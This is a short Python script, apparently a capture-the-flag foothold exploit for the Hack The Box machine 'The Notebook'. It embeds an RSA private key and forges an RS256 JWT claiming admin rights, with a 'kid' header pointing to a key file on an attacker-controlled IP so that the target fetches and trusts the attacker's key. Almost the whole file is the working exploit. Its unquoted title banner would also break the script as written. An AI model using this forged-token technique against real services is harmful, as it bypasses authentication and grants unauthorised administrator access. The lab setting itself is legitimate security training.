#!/usr/bin/python

##################################
HacktheBox - The Notebook FOOTHOLD
##################################

import jwt

private_key = '''
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQC5Q7pFukV3cuWMdo8OTsJneM5knaVcCp3VHjT85kA/Vf0AqoIm
8Tm4HtLyNZ6PBMlPYdcrokUmtv5ppFoXAqBbT6Wr1jhzumY9NW3DcSMTQTlQt3Kv
EcjOUe2BYFHxEoRCxltRjwvndNPsjlT/nm67JOG2vBvUSOKRnHofeIAXmQIDAQAB
AoGASg+oLG29jXXSDCftImQb1S93GsPmsffQhrzvo9YMAwXGAXkoVJcEYvV3kLoc
q8HXFDPhx6C0Ejj/VY4NMbusDIY4Zay9peJ/UOIx348jbe3FZA3nmBkFN1mQg/r3
MNZtZWKGJ+lNutuorQMBkcL/lT/VvVqB9D4Wcq2/DWtzQ4ECQQDokJOHqYLL/xnO
kYd/KZIOoh+1o66KuoM7XsY30gHheJk3XUUOId16FRS10W/h4VUKe+JP1DidgF5v
ViBADIkRAkEAy+71VXQr12YtThKdPRPT/QpWwr9lrLssqYeru/ovka6ciLvBcfow
gRE1jmb2hBcLr0E+cxtdo/NbFyhc9krmCQJBAN4xMyKL63EnOurG06PEfc0JTC5o
Qdw9MiBI/ixasn1OkWP58n38EPQQrAbCIJi4hl1L2v7WDXk9KfxJVuqaj2ECQEVy
lN2K+DscMqV5tU5NaE2traoYX9mYzDbXWuZi5rwnyGrP9aqI1ue9Io3iBmUpK/N8
tnWghh0FDKowNqgxDXECQCGyxc+hioH8sOp86jswQGeDiyqe31iYxH/jg82jJFcr
AM+9Dehy15UwyGnmLiBkbZOT5Pk1cN06OzG4t4ksr2w=
-----END RSA PRIVATE KEY-----
'''
payload = {"username":"dex","email":"test@user.com","admin_cap":True}
token = jwt.encode(payload,private_key,algorithm='RS256',headers={"kid": "http://10.10.14.152/privKey.key"})
print(token)
